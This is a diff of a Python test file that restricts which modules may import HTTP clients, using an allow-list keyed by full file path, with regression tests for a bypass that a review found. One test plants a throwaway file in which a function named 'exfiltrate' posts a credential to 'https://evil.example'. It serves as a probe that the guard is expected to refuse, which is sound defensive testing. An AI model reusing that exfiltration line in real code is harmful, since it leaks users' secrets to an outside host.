@@ -481,103 +481,194 @@ def test_the_lobby_is_refused_as_a_write_target() -> None:
 #: meant inheriting the wrong rule, exactly as folding the write client into
 #: the read client would have (IMP-277).
 #:
-#: Package G adds the fourth, and the list stopped being a flat set when it
-#: did (ADR-0005 6). The old spelling was ``name in OUTBOUND_CLIENT_MODULES
-#: and parent.name == "technocore"``, which had two faults that only showed
-#: once a client lived somewhere else: it would have **passed** an
-#: ``opencode/client.py`` that imported httpx without anyone deciding to
-#: allow it - ``client.py`` was on the list - and it simultaneously described
-#: every allowed module as living in one directory, which is no longer true.
+#: Package G adds the fourth, and the list changed shape twice while it did.
 #:
-#: So the allow-list is now a map from **package directory** to the modules
-#: allowed inside it. Each outbound surface is named where it actually lives,
-#: a module name allowed in one package is not thereby allowed in another,
-#: and adding a directory is as visible a change as adding a module.
+#: The spelling before G was ``path.name not in NAMES or path.parent.name !=
+#: "technocore"``. That would have **refused** ``opencode/client.py`` - the
+#: new client does not live in ``technocore/`` - while simultaneously
+#: asserting that every allowed module lives in one directory, which had
+#: stopped being true.
+#:
+#: The first fix keyed the list by the **bare parent directory name**, and a
+#: review broke it in one move: a file planted at
+#: ``station_api/plugins/opencode/client.py`` importing httpx passed every
+#: test in this file, because its parent directory is *called* ``opencode``.
+#: A bare name is not a location, and any new directory named ``opencode`` or
+#: ``technocore`` - anywhere in the tree - inherited the exemption.
+#:
+#: So the allow-list is now keyed by each module's **full path relative to
+#: the source root**, in POSIX form. ``station_api/opencode/client.py`` is
+#: one file rather than a naming convention, and a second file with that name
+#: in a different directory is a new outbound surface and is refused
+#: (IMP-367).
 #:
 #: ``opencode/client.py`` earns its entry the way the third did, and with two
 #: reasons neither of the others had: a **different origin** and a
 #: **different authentication model**. It is the only module in the
 #: application that carries a credential outbound.
 #:
-#: This map is the review boundary. A fifth entry means a fifth outbound
+#: This list is the review boundary. A fifth entry means a fifth outbound
 #: surface, and adding one here is the change a reviewer must see.
-OUTBOUND_CLIENT_MODULES: dict[str, set[str]] = {
-    "technocore": {"client.py", "write_client.py", "evidence_client.py"},
-    "opencode": {"client.py"},
-}
+OUTBOUND_CLIENT_MODULES: frozenset[str] = frozenset(
+    {
+        "station_api/technocore/client.py",
+        "station_api/technocore/write_client.py",
+        "station_api/technocore/evidence_client.py",
+        "station_api/opencode/client.py",
+    }
+)
+
+#: The client packages an import is searched for.
+HTTP_CLIENT_PACKAGES = ("httpx", "requests", "aiohttp", "urllib3", "http.client")
+
+
+def _imported_names(tree: ast.AST) -> list[str]:
+    names: list[str] = []
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Import):
+            names.extend(alias.name for alias in node.names)
+        elif isinstance(node, ast.ImportFrom):
+            names.append(node.module or "")
+    return names
+
+
+def http_client_offenders(source_root: Path) -> list[str]:
+    """Every module under ``source_root`` importing an HTTP client unallowed.
+
+    Extracted from the test below so the rule can be run against a *planted*
+    tree as well as against the real one. A guard that has only ever been
+    pointed at a repository which satisfies it has not been shown to refuse
+    anything.
+    """
+    offenders: list[str] = []
+    for path in sorted(source_root.rglob("*.py")):
+        relative = path.relative_to(source_root).as_posix()
+        if relative in OUTBOUND_CLIENT_MODULES:
+            continue
+        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
+        for name in _imported_names(tree):
+            if any(
+                name == package or name.startswith(f"{package}.")
+                for package in HTTP_CLIENT_PACKAGES
+            ):
+                offenders.append(f"{relative}: {name}")
+    return offenders
 
 
 def test_httpx_is_imported_only_by_the_reviewed_clients(
     api_source_root: Path,
 ) -> None:
-    """Exactly four outbound clients, in exactly four named places.
+    """Exactly four outbound clients, at exactly four named paths.
 
     Before Stage 3 this asserted no HTTP client existed anywhere. That was
     the honest statement while none did. The assertion has been narrowed four
     times since, never dropped: any *other* module importing an HTTP client
-    is a new outbound surface that nothing has reviewed - and now "other"
-    includes the right file name in the wrong package.
+    is a new outbound surface that nothing has reviewed - and "other" now
+    includes an allowed file name at an unreviewed path.
     """
-    clients = ("httpx", "requests", "aiohttp", "urllib3", "http.client")
-
-    offenders: list[str] = []
-    for path in api_source_root.rglob("*.py"):
-        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
-        allowed = path.name in OUTBOUND_CLIENT_MODULES.get(path.parent.name, set())
-        for node in ast.walk(tree):
-            if isinstance(node, ast.Import):
-                names = [alias.name for alias in node.names]
-            elif isinstance(node, ast.ImportFrom):
-                names = [node.module or ""]
-            else:
-                continue
-            for name in names:
-                if (
-                    any(name == c or name.startswith(f"{c}.") for c in clients)
-                    and not allowed
-                ):
-                    offenders.append(f"{path.relative_to(api_source_root)}: {name}")
+    offenders = http_client_offenders(api_source_root)
 
     assert offenders == [], f"an HTTP client is imported outside the reviewed clients: {offenders}"
+
+
+def test_a_client_planted_where_a_directory_borrows_an_allowed_name_is_refused(
+    tmp_path: Path,
+) -> None:
+    """The review's own probe, kept as a regression (IMP-367).
+
+    While the list was keyed by the bare parent directory name, this exact
+    file - an unreviewed module importing httpx and posting a credential to
+    an arbitrary host - passed the whole suite in silence, because its parent
+    directory happened to be *called* ``opencode``. It is planted in a
+    throwaway tree rather than in the repository, so the probe cannot itself
+    become the surface it is checking for.
+    """
+    planted = tmp_path / "station_api" / "plugins" / "opencode" / "client.py"
+    planted.parent.mkdir(parents=True)
+    planted.write_text(
+        "import httpx\n"
+        "def exfiltrate(key: str) -> None:\n"
+        '    httpx.post("https://evil.example", headers={"X": key})\n',
+        encoding="utf-8",
+    )
+
+    # A genuinely allow-listed path in the same throwaway tree, so the test
+    # shows the rule discriminating rather than merely refusing everything.
+    allowed = tmp_path / "station_api" / "opencode" / "client.py"
+    allowed.parent.mkdir(parents=True)
+    allowed.write_text("import httpx\n", encoding="utf-8")
+
+    assert http_client_offenders(tmp_path) == [
+        "station_api/plugins/opencode/client.py: httpx"
+    ]
+
+
+def test_a_client_planted_where_a_directory_borrows_the_technocore_name_is_refused(
+    tmp_path: Path,
+) -> None:
+    """The same hole from the other direction.
+
+    ``technocore`` was the older borrowed name, and a directory named after
+    it anywhere in the tree would have inherited three allowed module names
+    at once.
+    """
+    for name in ("client.py", "write_client.py", "evidence_client.py"):
+        planted = tmp_path / "station_api" / "vendor" / "technocore" / name
+        planted.parent.mkdir(parents=True, exist_ok=True)
+        planted.write_text("import httpx\n", encoding="utf-8")
+
+    assert http_client_offenders(tmp_path) == [
+        "station_api/vendor/technocore/client.py: httpx",
+        "station_api/vendor/technocore/evidence_client.py: httpx",
+        "station_api/vendor/technocore/write_client.py: httpx",
+    ]
 
 
 def test_every_reviewed_client_module_actually_exists(api_source_root: Path) -> None:
     """An allow-list entry for a module that is gone is a silent widening.
 
-    Deleting ``write_client.py`` while leaving its name on the list would
-    quietly re-permit any future file with that name in that package. Naming
-    a module is a decision about that module, in that directory.
+    Deleting ``write_client.py`` while leaving its path on the list would
+    quietly re-permit any future file written back to that path. Naming a
+    module is a decision about that file, at that location.
     """
-    package_root = api_source_root / "station_api"
-    for package, names in OUTBOUND_CLIENT_MODULES.items():
-        directory = package_root / package
-        assert directory.is_dir(), f"{package} is allow-listed but missing"
-        for name in names:
-            assert (directory / name).is_file(), (
-                f"{package}/{name} is allow-listed but missing"
-            )
+    for relative in sorted(OUTBOUND_CLIENT_MODULES):
+        assert (api_source_root / relative).is_file(), (
+            f"{relative} is allow-listed but missing"
+        )
 
 
-def test_the_allow_list_is_keyed_by_package_and_not_by_file_name(
+def test_the_allow_list_is_keyed_by_full_path_and_not_by_a_bare_name(
     api_source_root: Path,
 ) -> None:
-    """The regression the map exists for, stated as a property.
+    """The regression the list exists for, stated as a property.
 
-    ``client.py`` is an allowed name in two packages and would be an
-    unreviewed outbound surface in any third. A flat set of file names could
-    not express that; this asserts the map does, by checking a name allowed
-    in one package is refused in another that really exists.
+    ``client.py`` is an allowed name at two paths and would be an unreviewed
+    outbound surface at any third. Neither a flat set of file names nor a map
+    keyed by the bare parent directory could express that: the first admitted
+    ``opencode/client.py`` before anyone decided to allow it, and the second
+    admitted ``plugins/opencode/client.py`` after everyone thought it could
+    not.
     """
-    assert "client.py" in OUTBOUND_CLIENT_MODULES["opencode"]
-    assert "client.py" in OUTBOUND_CLIENT_MODULES["technocore"]
+    for relative in OUTBOUND_CLIENT_MODULES:
+        assert relative.startswith("station_api/"), relative
+        assert relative.count("/") >= 2, relative
+
+    # Neither bare spelling the list has previously worn is on it.
+    assert "client.py" not in OUTBOUND_CLIENT_MODULES
+    assert "write_client.py" not in OUTBOUND_CLIENT_MODULES
+    assert "opencode" not in OUTBOUND_CLIENT_MODULES
+    assert "technocore" not in OUTBOUND_CLIENT_MODULES
 
     # A package that exists, has Python in it, and is on nobody's list.
     assert (api_source_root / "station_api" / "evidence").is_dir()
-    assert "evidence" not in OUTBOUND_CLIENT_MODULES
+    assert not any(
+        relative.startswith("station_api/evidence/")
+        for relative in OUTBOUND_CLIENT_MODULES
+    )
 
     # And the reverse direction: the write client's name is *not* borrowed
     # into the new package's allowance.
-    assert "write_client.py" not in OUTBOUND_CLIENT_MODULES["opencode"]
+    assert "station_api/opencode/write_client.py" not in OUTBOUND_CLIENT_MODULES
 
 
 def test_the_write_client_is_not_reachable_from_the_read_path(
